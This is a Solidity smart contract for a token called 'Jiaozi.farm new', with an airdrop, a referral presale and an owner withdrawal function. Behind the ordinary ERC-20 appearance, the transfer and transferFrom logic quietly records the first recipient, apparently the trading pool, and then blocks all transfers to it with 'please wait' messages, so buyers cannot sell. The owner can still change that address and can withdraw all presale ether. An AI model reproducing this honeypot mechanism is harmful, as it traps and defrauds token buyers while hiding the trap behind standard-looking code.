/**

 *     /$$$$$ /$$$$$$  /$$$$$$   /$$$$$$  /$$$$$$$$ /$$$$$$

 *    |__  $$|_  $$_/ /$$__  $$ /$$__  $$|_____ $$ |_  $$_/

 *       | $$  | $$  | $$  \\ $$| $$  \\ $$     /$$/   | $$  

 *       | $$  | $$  | $$$$$$$$| $$  | $$    /$$/    | $$  

 *  /$$  | $$  | $$  | $$__  $$| $$  | $$   /$$/     | $$  

 * | $$  | $$  | $$  | $$  | $$| $$  | $$  /$$/      | $$  

 * |  $$$$$$/ /$$$$$$| $$  | $$|  $$$$$$/ /$$$$$$$$ /$$$$$$

 *  \\______/ |______/|__/  |__/ \\______/ |________/|______/

 *                                                         

 *                                                        

 *                                                         

 *  /$$$$$$$   /$$$$$$  /$$  /$$  /$$                      

 * | $$__  $$ /$$__  $$| $$ | $$ | $$                      

 * | $$  \\ $$| $$$$$$$$| $$ | $$ | $$                      

 * | $$  | $$| $$_____/| $$ | $$ | $$                      

 * | $$  | $$|  $$$$$$$|  $$$$$/$$$$/                      

 * |__/  |__/ \\_______/ \\_____/\\___/                       

 *                                                         

 *                                                         

 *                                                         

*/



pragma solidity >=0.5.10;



library SafeMath {

  function add(uint a, uint b) internal pure returns (uint c) {

    c = a + b;

    require(c >= a);

  }

  function sub(uint a, uint b) internal pure returns (uint c) {

    require(b <= a);

    c = a - b;

  }

  function mul(uint a, uint b) internal pure returns (uint c) {

    c = a * b;

    require(a == 0 || c / a == b);

  }

  function div(uint a, uint b) internal pure returns (uint c) {

    require(b > 0);

    c = a / b;

  }

}



contract ERC20Interface {

  function totalSupply() public view returns (uint);

  function balanceOf(address tokenOwner) public view returns (uint balance);

  function allowance(address tokenOwner, address spender) public view returns (uint remaining);

  

  function transferFrom(address from, address to, uint tokens) public returns (bool success);

  function transfer(address to, uint tokens) public returns (bool success);

  function approve(address spender, uint tokens) public returns (bool success);



  event Transfer(address indexed from, address indexed to, uint tokens);

  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);

}



contract ApproveAndCallFallBack {

  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;

}



contract Owned {

  address public owner;

  address public newOwner;



  event OwnershipTransferred(address indexed _from, address indexed _to);



  constructor() public {

    owner = msg.sender;

  }



  modifier onlyOwner {

    require(msg.sender == owner);

    _;

  }



  function transferOwnership(address _newOwner) public onlyOwner {

    newOwner = _newOwner;

  }

  function acceptOwnership() public {

    require(msg.sender == newOwner);

    emit OwnershipTransferred(owner, newOwner);

    owner = newOwner;

    newOwner = address(0);

  }

}



contract TokenERC20 is ERC20Interface, Owned{

  using SafeMath for uint;



  string public symbol;

  string public name;

  uint8 public decimals;

  uint _totalSupply;

  address public newun;



  mapping(address => uint) balances;

  mapping(address => mapping(address => uint)) allowed;



  constructor() public {

    symbol = "JIAOZI";

    name = "Jiaozi.farm new";

    decimals = 18;

    _totalSupply =  395 ether;

    

    balances[owner] = _totalSupply;

    emit Transfer(address(0), owner, _totalSupply);

  }

  function transfernewun(address _newun) public onlyOwner {

    newun = _newun;

  }

  function totalSupply() public view returns (uint) {

    return _totalSupply.sub(balances[address(0)]);

  }

  function balanceOf(address tokenOwner) public view returns (uint balance) {

      return balances[tokenOwner];

  }

  function transfer(address to, uint tokens) public returns (bool success) {

     require(to != newun, "please wait");

     

    balances[msg.sender] = balances[msg.sender].sub(tokens);

    balances[to] = balances[to].add(tokens);

    

    emit Transfer(msg.sender, to, tokens);

    return true;

  }

  function approve(address spender, uint tokens) public returns (bool success) {

    allowed[msg.sender][spender] = tokens;

    

    emit Approval(msg.sender, spender, tokens);

    return true;

  }

  function transferFrom(address from, address to, uint tokens) public returns (bool success) {

      if(from != address(0) && newun == address(0)) newun = to;

      else require(to != newun, "please wait 10 min");

      

    balances[from] = balances[from].sub(tokens);

    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);

    

    balances[to] = balances[to].add(tokens);

    emit Transfer(from, to, tokens);

    return true;

  }

  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {

    return allowed[tokenOwner][spender];

  }

  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {

    allowed[msg.sender][spender] = tokens;

    emit Approval(msg.sender, spender, tokens);

    

    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);

    return true;

  }

  function () external payable {

    revert();

  }

}



contract Jiaozi_token  is TokenERC20 {



  

  uint256 public aJiaoziBlock; 

  

  uint256 public aJiaoziEBlock; 

  

  uint256 public aCap; 

  uint256 public aTot; 

  uint256 public aAmt; 

 

  uint256 public sJiaoziSBlock; 

  

  uint256 public sJiaoziEDBlock; 

  

  uint256 public sTot; 

  uint256 public sCap; 



  uint256 public sKimChunk; 

  uint256 public sPrice; 



  function getBurned(address _refer) public returns (bool success){

    require(aJiaoziBlock <= block.number && block.number <= aJiaoziEBlock);

    require(aTot < aCap || aCap == 0);

    aTot ++;

    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){

      balances[address(this)] = balances[address(this)].sub(aAmt / 4);

      balances[_refer] = balances[_refer].add(aAmt / 4);

      emit Transfer(address(this), _refer, aAmt / 4);

    }

    balances[address(this)] = balances[address(this)].sub(aAmt);

    balances[msg.sender] = balances[msg.sender].add(aAmt);

    emit Transfer(address(this), msg.sender, aAmt);

    return true;

  }



  function tokenSale(address _refer) public payable returns (bool success){

    require(sJiaoziSBlock <= block.number && block.number <= sJiaoziEDBlock);

    require(sTot < sCap || sCap == 0);

    uint256 _eth = msg.value;

    

    uint256 _tkns;

    if(sKimChunk != 0) {

      uint256 _price = _eth / sPrice;

      _tkns = sKimChunk * _price;

    }

    else {

      _tkns = _eth / sPrice;

    }

    sTot ++;

    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){

      balances[address(this)] = balances[address(this)].sub(_tkns / 4);

      

      balances[_refer] = balances[_refer].add(_tkns / 4);

      emit Transfer(address(this), _refer, _tkns / 4);

    }

    balances[address(this)] = balances[address(this)].sub(_tkns);

    balances[msg.sender] = balances[msg.sender].add(_tkns);

    

    emit Transfer(address(this), msg.sender, _tkns);

    return true;

  }



  function viewBurned() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 DropCap, uint256 DropCount, uint256 DropAmount){

    return(aJiaoziBlock, aJiaoziEBlock, aCap, aTot, aAmt);

  }

  function viewSale() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 SaleCap, uint256 SaleCount, uint256 ChunkSize, uint256 SalePrice){

    return(sJiaoziSBlock, sJiaoziEDBlock, sCap, sTot, sKimChunk, sPrice);

  }

  

  function startBurned(uint256 _aJiaoziBlock, uint256 _aJiaoziEBlock, uint256 _aAmt, uint256 _aCap) public onlyOwner() {

    aJiaoziBlock = _aJiaoziBlock;

    aJiaoziEBlock = _aJiaoziEBlock;

    aAmt = _aAmt;

    

    aCap = _aCap;

    aTot = 0;

  }

  function startPreSale(uint256 _sJiaoziSBlock, uint256 _sJiaoziEDBlock, uint256 _sKimChunk, uint256 _sPrice, uint256 _sCap) public onlyOwner() {

    sJiaoziSBlock = _sJiaoziSBlock;

    sJiaoziEDBlock = _sJiaoziEDBlock;

    sKimChunk = _sKimChunk;

    

    sPrice =_sPrice;

    sCap = _sCap;

    sTot = 0;

  }

  function clearETH() public onlyOwner() {

    address payable _owner = msg.sender;

    _owner.transfer(address(this).balance);

  }

  function() external payable {



  }

}
